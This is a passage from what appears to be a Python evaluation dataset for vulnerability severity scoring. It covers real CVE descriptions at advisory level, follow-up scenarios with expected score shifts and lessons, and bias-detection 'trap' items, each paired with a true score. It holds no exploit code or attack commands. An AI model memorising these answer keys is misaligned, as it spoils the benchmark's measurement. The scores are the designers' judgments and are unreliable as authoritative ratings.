            "full domain compromise (all users, all machines, all data)\n"
            "Data at Risk: Complete Active Directory domain — all user credentials, group policies, "
            "DPAPI secrets, certificate authority if present\n"
            "Exploitability: Trivial — exploit is ~10 lines of Python, takes seconds\n"
            "Active Exploitation: Widely exploited by ransomware groups and APTs. "
            "CISA emergency directive ED 20-04\n"
            "Patch: August 2020 security update (enforcement phase February 2021)\n"
            "Workaround: None — must patch. Enforcement mode breaks non-compliant devices"
        ),
        risk_factors=["CVSS 10.0", "trivial exploitation", "complete domain compromise", "CISA emergency directive", "no auth required", "affects all DCs"],
        mitigants=["requires network access (not internet-facing)", "patch available"],
    ),
    EvalItem(
        name="FortiGateSSLVPN",
        category="Authentication Bypass",
        true_score=78,
        is_training=False,
        description=(
            "FortiGate SSL-VPN — CVE-2023-27997 (CVSS 9.2)\n"
            "Affected System: Fortinet FortiGate firewalls with SSL-VPN enabled\n"
            "Attack Vector: Network-accessible via SSL-VPN portal, pre-authentication\n"
            "Vulnerability: Heap-based buffer overflow in SSL-VPN pre-authentication handling "
            "allows remote code execution as root on the firewall appliance\n"
            "Scope: Estimated 250,000+ FortiGate firewalls with SSL-VPN exposed to internet. "
            "FortiGate often serves as the network perimeter — compromise = network entry\n"
            "Data at Risk: VPN credentials, network traffic inspection, access to internal network, "
            "firewall policy manipulation\n"
            "Exploitability: PoC available, exploitation observed in targeted attacks\n"
            "Active Exploitation: Confirmed by Fortinet, used in targeted attacks against government\n"
            "Patch: FortiOS 7.2.5+, 7.0.12+, 6.4.13+, 6.2.15+\n"
            "Workaround: Disable SSL-VPN (breaks remote access)"
        ),
        risk_factors=["CVSS 9.2", "pre-auth RCE as root", "250K+ exposed devices", "perimeter device (gateway to network)", "targeted government attacks"],
        mitigants=["patch available across all supported versions", "targeted not mass exploitation", "can disable SSL-VPN"],
    ),
    EvalItem(
        name="AtlassianConfluence",
        category="Remote Code Execution",
        true_score=75,
        is_training=False,
        description=(
            "Atlassian Confluence OGNL Injection — CVE-2022-26134 (CVSS 9.8)\n"
            "Affected System: Atlassian Confluence Server and Data Center (all versions)\n"
            "Attack Vector: Network-accessible, no authentication required\n"
            "Vulnerability: OGNL injection via specially crafted URI allows arbitrary code execution. "
            "Attacker sends a single HTTP request to achieve RCE\n"
            "Scope: All Confluence Server/Data Center instances accessible from the network. "
            "Confluence often contains sensitive internal documentation, credentials, architecture docs\n"
            "Data at Risk: All Confluence content — internal wikis, credentials stored in pages, "
            "architecture documentation, HR data, project plans. Server-level access for lateral movement\n"
            "Exploitability: Trivial — single HTTP request, public exploits within hours of disclosure\n"
            "Active Exploitation: Actively exploited as zero-day before patch. "
            "CISA emergency directive ED 22-02\n"
            "Patch: Confluence 7.4.17+, 7.13.7+, 7.14.3+, 7.15.2+, 7.16.4+, 7.17.4+, 7.18.1+\n"
            "Workaround: Block external access or apply WAF rule for ${...} patterns"
        ),
        risk_factors=["CVSS 9.8", "zero-day exploitation", "trivial single-request RCE", "CISA emergency directive", "Confluence contains sensitive internal docs"],
        mitigants=["patch available", "WAF can block (partial)", "Confluence Cloud not affected", "primarily targets on-premises instances"],
    ),
    EvalItem(
        name="F5BigIP",
        category="Remote Code Execution",
        true_score=84,
        is_training=False,
        description=(
            "F5 BIG-IP iControl REST — CVE-2022-1388 (CVSS 9.8)\n"
            "Affected System: F5 BIG-IP application delivery controllers\n"
            "Attack Vector: Network-accessible management interface, authentication bypass\n"
            "Vulnerability: Authentication bypass in iControl REST API allows unauthenticated "
            "attacker to execute arbitrary system commands as root. A single curl request achieves RCE\n"
            "Scope: F5 BIG-IP devices with management interface exposed. BIG-IP typically handles "
            "SSL termination, load balancing, and WAF for critical applications — compromise enables "
            "traffic interception and manipulation\n"
            "Data at Risk: All traffic passing through the BIG-IP (potentially including credentials, "
            "API keys, session tokens). Root access to the appliance. Pivot to internal network\n"
            "Exploitability: Trivial — single curl command, PoC published within days\n"
            "Active Exploitation: Mass exploitation observed, including data-wiping attacks that "
            "destroyed BIG-IP configurations\n"
            "Patch: F5 released patches for affected versions\n"
            "Workaround: Block iControl REST access via self IP, restrict management interface"
        ),
        risk_factors=["CVSS 9.8", "single-command RCE as root", "traffic interception capability", "mass exploitation including destructive attacks", "critical infrastructure device"],
        mitigants=["management interface exposure required (should not be internet-facing)", "patch available", "access restriction possible"],
    ),
]


# ============================================================================
# SCENARIOS — 5 training scenarios
# ============================================================================

SCENARIOS = [
    Scenario(
        name="heartbleed_escalation",
        description=(
            "HeartbleedDB Escalation:\n"
            "48 hours after initial discovery, threat intelligence reports that a ransomware "
            "group has incorporated the HeartbleedDB exploit into their automated toolkit. "
            "Your SIEM shows 2,100 unique IPs probing the vulnerable service (up from 340). "
            "One probe successfully extracted a valid admin session token. "
            "How does this change your severity assessment?"
        ),
        expected_impact="Score should increase 5-10 points — active weaponization confirmed",
        lesson="When active exploitation escalates from probing to weaponized toolkits, severity increases regardless of available patches. The window between 'patch available' and 'patch deployed' is the danger zone. Every hour of exposure with active exploitation increases real-world impact.",
    ),
    Scenario(
        name="cloudleak_discovery",
        description=(
            "CloudLeak Data Discovery:\n"
            "A security researcher contacts you: they found the exposed S3 bucket and discovered "
            "it also contains a subdirectory with production database exports from 2 months ago "
            "(before the last key rotation). These exports contain 150K customer email addresses "
            "and bcrypt-hashed passwords. The researcher has not published findings yet. "
            "How does this change your severity assessment?"
        ),
        expected_impact="Score should increase significantly — production data in the bucket changes everything",
        lesson="Always assume the worst about exposed storage. Initial assessment said 'non-production data' but deeper inspection found production exports. The true scope of cloud misconfigs is almost always worse than first reported. Re-assess any time new data is discovered in the exposed resource.",
    ),
    Scenario(
        name="sqli_incident",
        description=(
            "SQLi-Legacy Incident Response:\n"
            "During a routine audit, you discover that someone accessed the admin panel search "
            "function with UNION SELECT payloads 3 weeks ago. The source IP belongs to a terminated "
            "employee. Forensics show they extracted the full customer table (800K records). "
            "No public disclosure has occurred yet. How does this change your severity assessment?"
        ),
        expected_impact="Score should increase significantly — confirmed data breach",
        lesson="A vulnerability that has been exploited is fundamentally different from one that could be. The SQLi went from 'risky but requires VPN+auth' to 'confirmed breach with insider threat.' The lack of logging on the admin panel meant this went undetected for 3 weeks. No logging = assume the worst.",
    ),
    Scenario(
        name="container_hardening",
        description=(
            "PrivEsc-Container Remediation:\n"
            "The platform team removed privileged mode from 4 of 6 containers within 24 hours. "
            "The remaining 2 require privileged mode for legitimate reasons (GPU access, network "
            "monitoring). They've added network policies blocking metadata endpoint access and "
            "implemented PodSecurityPolicies. Additionally, they deployed Falco for runtime "
            "container security monitoring. How does this change your severity assessment?"
        ),
        expected_impact="Score should decrease significantly — major risk reduction",
        lesson="Partial remediation that addresses the highest-impact paths (metadata endpoint, 4 of 6 containers) reduces severity even when complete fix isn't possible. Defense-in-depth (PodSecurityPolicies + network policies + runtime monitoring) compounds. Residual risk from 2 privileged containers is manageable with monitoring.",
    ),
    Scenario(
        name="xss_escalation",
        description=(
            "XSS-Stored Escalation:\n"
            "A researcher demonstrates that the stored XSS can be chained with a CSRF vulnerability "
            "to perform actions on behalf of admin users — specifically, it can modify billing settings "
            "and export customer lists. However, the team deploys the HttpOnly cookie fix within "
            "2 hours of the report. The underlying XSS is still present but cookie theft no longer works. "
            "How does this change your severity assessment?"
        ),
        expected_impact="Mixed: CSRF chain increases theoretical severity but HttpOnly fix blocks the main attack vector",
        lesson="Quick partial mitigation (HttpOnly flag) can dramatically reduce effective severity even when the root cause isn't fixed. The CSRF chain is concerning but without cookie theft, the attack requires a much more complex exploitation chain. Assess based on current exploitable impact, not theoretical maximum.",
    ),
    Scenario(
        name="supply_chain_discovery",
        description=(
            "SolarWinds Follow-up Discovery:\n"
            "Six months after the initial SUNBURST remediation, your threat hunting team discovers "
            "a second backdoor (SUNSPOT) that was implanted in the SolarWinds build system itself. "
            "SUNSPOT injected SUNBURST into the source code during compilation, meaning the attack "
            "was deeper than initially assessed. Your organization's Orion server was among the 18,000 "
            "that received the trojanized update, but forensics initially showed no second-stage activity. "
            "Now you must reassess whether the lack of second-stage C2 was genuine or whether "
            "a more sophisticated implant was missed. How does this change your severity assessment?"
        ),
        expected_impact="Score should remain very high or increase — supply chain depth compounds uncertainty",
        lesson="Supply chain attacks have layers. The initial compromise (SUNBURST in the update) was bad enough, but discovering the build-system implant (SUNSPOT) means the attacker had deeper access than initially assessed. 'We found no second-stage activity' becomes less reassuring when you learn the attacker could have implanted artifacts you aren't looking for. Supply chain severity should never decrease on follow-up discovery — it can only stay high or go higher.",
    ),
    Scenario(
        name="patch_bypass",
        description=(
            "Spring4Shell Patch Bypass:\n"
            "After applying the Spring Framework 5.3.18 patch for CVE-2022-22965, your security "
            "team runs a validation scan and confirms the original PoC no longer works. However, "
            "a researcher publishes a bypass technique that works on patched versions when a specific "
            "third-party library (commons-configuration2) is in the classpath. Your application does "
            "use this library. The bypass is more complex than the original but still achievable. "
            "How does this change your severity assessment?"
        ),
        expected_impact="Score should increase moderately — patch was insufficient for this configuration",
        lesson="Patching does not always mean remediation. When a vulnerability has narrow preconditions, there may be alternative paths the patch doesn't cover. The original Spring4Shell was scored lower because of its narrow attack surface — but a bypass that uses a different classpath entry reopens the attack for affected configurations. Reassess patched vulnerabilities when bypass research is published, especially for complex frameworks with many dependency combinations.",
    ),
    Scenario(
        name="ransomware_mass_exploit",
        description=(
            "ESXi OpenSLP Ransomware Campaign:\n"
            "The CVE-2021-21974 patch was available for two years, but your organization never applied "
            "it because the ESXi hosts were 'internal only' and behind a firewall. An attacker compromises "
            "a VPN account (via credential stuffing) and gains internal network access. They scan for "
            "port 427 and find 12 unpatched ESXi hosts. Within 4 hours, all 12 hosts are encrypted "
            "by ESXiArgs ransomware. 47 virtual machines are offline. The estimated recovery time "
            "without paying ransom is 2 weeks. How does this change your severity assessment?"
        ),
        expected_impact="Score should increase — 'internal only' assumption failed, two-year-old patch was critical",
        lesson="'Internal only' is not a mitigant when network boundaries are routinely bypassed via VPN compromise, phishing, or lateral movement. A two-year-old unpatched vulnerability is MORE dangerous than a fresh zero-day because attackers have mature, reliable exploits. Severity assessment must account for actual patching velocity, not just patch availability. If a patch exists but isn't applied, the effective risk is closer to the unpatched score regardless of how long the patch has been available.",
    ),
]


# ============================================================================
# TRAP VULNERABILITIES — 6 items for adversarial bias detection
# ============================================================================

TRAP_VULNS = [
    TrapItem(
        name="SophisticatedButLow",
        true_score=22,
        bias_type="complexity-severity-confusion",
        description=(
            "SophisticatedButLow — Advanced Cache Timing Side Channel\n"
            "Affected System: CDN edge cache serving static marketing pages\n"
            "Attack Vector: Requires precise network positioning and microsecond-level timing analysis\n"
            "Vulnerability: Cache timing differences reveal whether specific marketing page URLs "
            "exist, allowing enumeration of unpublished marketing campaign slugs\n"
            "Scope: Marketing page URL structure only — no user data, auth, or application logic\n"
            "Data at Risk: Names of upcoming marketing campaigns (pre-announcement)\n"
            "Exploitability: Requires specialized equipment and expertise, 0.01% success rate per attempt\n"
            "Active Exploitation: No reports, theoretical only\n"
            "Patch: Add random delay to cache responses (minor performance impact)\n"
            "Workaround: None needed — risk is minimal"
        ),
    ),
    TrapItem(
        name="SimpleButHigh",
        true_score=78,
        bias_type="simplicity-underweight",
        description=(
            "SimpleButHigh — Default Admin Credentials on Customer Portal\n"
            "Affected System: Customer-facing support portal, 120K registered users\n"
            "Attack Vector: Public internet, login page\n"
            "Vulnerability: Admin account uses default credentials (admin/admin123). "
            "Admin panel allows viewing all customer tickets including PII, resetting passwords, "
            "and downloading customer data exports\n"
            "Scope: Full admin access to customer support system, all 120K customer profiles\n"
            "Data at Risk: Customer PII, support ticket contents (may include credentials shared in tickets), "
            "ability to reset any customer's password\n"
            "Exploitability: Trivial — try admin/admin123\n"
            "Active Exploitation: Unknown — no login attempt logging\n"
            "Patch: Change the password. 30 seconds\n"
            "Workaround: Implement MFA immediately"
        ),
    ),
    TrapItem(
        name="PatchedButScary",
        true_score=15,
        bias_type="scary-name-bias",
        description=(
            "PatchedButScary — 'DOOMSDAY' Zero-Day in OpenSSL (Patched)\n"
            "Affected System: Web servers running OpenSSL\n"
            "Attack Vector: Was network-accessible, no auth required (before patch)\n"
            "Vulnerability: CVE-2024-XXXX, dubbed 'DOOMSDAY' by media. Remote code execution "
            "via TLS handshake. Was critical before patch.\n"
            "Current Status: Patch applied 6 hours after disclosure. All systems updated. "
            "WAF rules deployed. No evidence of exploitation during the 6-hour window. "
            "Vulnerability scanning confirms all instances patched.\n"
            "Data at Risk: None (patched)\n"
            "Exploitability: Was trivial, now impossible (patched)\n"
            "Active Exploitation: None post-patch\n"
            "Patch: Applied and verified\n"
            "Residual Risk: Only if patch is incomplete, which OpenSSL team denies"
        ),
    ),
    TrapItem(
        name="InternalDesktop",
        true_score=42,
        bias_type="internal-dismissal",
        description=(
            "InternalDesktop — Local Privilege Escalation on Finance Team Desktops\n"
            "Affected System: 25 Windows desktops in the finance department\n"
            "Attack Vector: Requires local user access (any employee on the machine)\n"
            "Vulnerability: Unquoted service path in a finance application allows any local user "
            "to escalate to SYSTEM. From SYSTEM, can access cached domain credentials, "
            "financial applications, and mapped network drives with financial data\n"
            "Scope: 25 machines with access to financial systems, AP/AR, payroll\n"
            "Data at Risk: Financial records, payroll data, vendor payment information, "
            "cached domain admin credentials on 3 of 25 machines\n"
            "Exploitability: Well-known technique, Metasploit module available\n"
            "Active Exploitation: No evidence\n"
            "Patch: Quote the service path in registry. 5-minute fix per machine\n"
            "Workaround: Remove write permissions to C:\\Program Files paths"
        ),
    ),
    TrapItem(
        name="HighCVSSPatched",
        true_score=18,
        bias_type="cvss-anchoring",
        description=(
            "HighCVSSPatched — Critical RCE in Load Balancer (Fully Remediated)\n"
            "Affected System: HAProxy load balancers (8 instances across 3 data centers)\n"
            "Attack Vector: Was network-accessible, pre-authentication (before remediation)\n"
            "Vulnerability: CVE-2023-XXXXX, CVSS 9.8. Integer overflow in HTTP/2 multiplexing "
            "allowed remote code execution as root on the load balancer\n"
            "Current Status: All 8 instances patched within 6 hours of advisory. "
            "Configuration hardened (HTTP/2 disabled on external-facing listeners as defense-in-depth). "
            "Forensic analysis confirmed no exploitation during the 6-hour window. "
            "Follow-up penetration test verified patch effectiveness. "
            "Monitoring rules deployed for the specific attack pattern.\n"
            "Data at Risk: None (fully remediated)\n"
            "Exploitability: Was critical, now fully mitigated\n"
            "Active Exploitation: None detected pre-patch or post-patch\n"
            "Patch: Applied and verified via pentest\n"
            "Residual Risk: Minimal — defense-in-depth measures in place"
        ),
    ),
    TrapItem(
        name="LowCVSSHighImpact",
        true_score=74,
        bias_type="cvss-underweight",
        description=(
            "LowCVSSHighImpact — Insecure Direct Object Reference in Healthcare API\n"
            "Affected System: Patient records API serving 340 clinics, 2.1M patient records\n"
            "Attack Vector: Authenticated API access (any registered clinician account)\n"
            "Vulnerability: CVSS 6.5 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N). Sequential patient IDs "
            "allow any authenticated clinician to access any patient's complete medical record "
            "by incrementing the ID parameter. No authorization check beyond authentication\n"
            "Scope: Any of 4,200 registered clinicians can access all 2.1M patient records\n"
            "Data at Risk: Complete PHI — diagnoses, medications, lab results, mental health notes, "
            "substance abuse records, HIV status. HIPAA breach notification required if exploited\n"
            "Exploitability: Trivial — change a number in the URL\n"
            "Active Exploitation: Unknown — API access logs show 3 clinician accounts accessed "
            "unusual volumes of records (investigating)\n"
            "Patch: Implement proper authorization middleware. 2-day development effort\n"
            "Workaround: Rate limiting per clinician (reduces but doesn't eliminate)"
        ),
    ),
]
